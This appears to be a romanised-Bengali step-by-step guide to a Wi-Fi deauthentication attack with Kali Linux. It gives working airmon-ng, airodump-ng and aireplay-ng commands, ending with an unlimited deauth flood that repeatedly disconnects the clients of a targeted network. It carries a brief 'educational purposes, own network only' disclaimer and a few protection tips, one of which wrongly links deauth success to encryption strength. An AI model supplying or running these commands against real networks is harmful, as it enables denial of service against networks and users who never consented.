Tumi jodi nijer Wi-Fi network e deauth attack korte chao, tahole **Kali Linux** use kore step-by-step process ta niche describe kora holo. Ei method shudhu **educational purposes** e ar nijer network er vulnerability test er jonno use koro.

---

### **Step 1: Kali Linux Setup**
Ensure kore nao je tumhar system e **Kali Linux installed** ache, ar Wi-Fi adapter monitor mode ar packet injection support kore. Tumhar laptop er Wi-Fi adapter er compatibility check er jonno ei command use koro:
```bash
sudo airmon-ng
```

---

### **Step 2: Wi-Fi Adapter Monitor Mode E Enable Koro**
Monitor mode enable korar jonno ei command use koro:
```bash
sudo airmon-ng start wlan0
```
- **`wlan0`**: Tumhar Wi-Fi adapter er naam. Jodi Wi-Fi adapter er naam different hoy (`wlan1`, etc.), tahole seta use koro.

Terminal output e **monitor mode enabled** message asbe, ar Wi-Fi interface er naam change hoye **wlan0mon** hobe.

---

### **Step 3: Wi-Fi Networks Scan Koro**
Nearby Wi-Fi networks scan korte ei command run koro:
```bash
sudo airodump-ng wlan0mon
```
- Ekhane tumhar network er **BSSID** (MAC address) ar **Channel Number** note koro. Eta deauth attack er jonno lagbe.

Example output:
```
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
XX:XX:XX:XX:XX:XX  -40       23      100    5   6  54e  WPA2 CCMP   PSK   MyWiFi
```
- Ekhane **BSSID** holo `XX:XX:XX:XX:XX:XX` ar **Channel** holo `6`.

---

### **Step 4: Target Network Select Koro**
Specific network target korar jonno ei command run koro:
```bash
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel 6 --write output wlan0mon
```
- **`XX:XX:XX:XX:XX:XX`**: Tumhar Wi-Fi network er BSSID.
- **`6`**: Tumhar Wi-Fi network er channel number.
- **`output`**: Ei naam e captured packets save hobe.

Ei command network er detailed activity dekhabey ar connected devices gula list korbe.

---

### **Step 5: Deauth Attack Launch Koro**
Deauthentication attack start korar jonno ei command run koro:
```bash
sudo aireplay-ng --deauth 0 -a XX:XX:XX:XX:XX:XX wlan0mon
```
- **`--deauth 0`**: Unlimited deauth packets send kore.
- **`-a XX:XX:XX:XX:XX:XX`**: Target Wi-Fi network er BSSID.
- **`wlan0mon`**: Monitor mode e thaka Wi-Fi interface.

Ei attack connected devices gulake repeatedly disconnect kore dibe.

---

### **Step 6: Monitor Mode Theke Normal Mode E Phire Asha**
Attack sesh hole monitor mode theke normal mode e phire ashte ei commands run koro:

1. Monitor mode disable koro:
   ```bash
   sudo airmon-ng stop wlan0mon
   ```

2. Wi-Fi service restart koro:
   ```bash
   sudo service NetworkManager restart
   ```

---

### **Important Tips**
1. **Network Vulnerability Check**:
   Ei process tumhar Wi-Fi network er security test korar jonno. Jodi deauth attack successful hoy, tahole tumhar network WPA/WPA2 encryption strong ache kina check koro.

2. **Protection Tips**:
   - Strong password use koro.
   - **WPA3 encryption** enable koro, jodi possible hoy.
   - Deauth attack er against tamper-proof routers use koro.

---

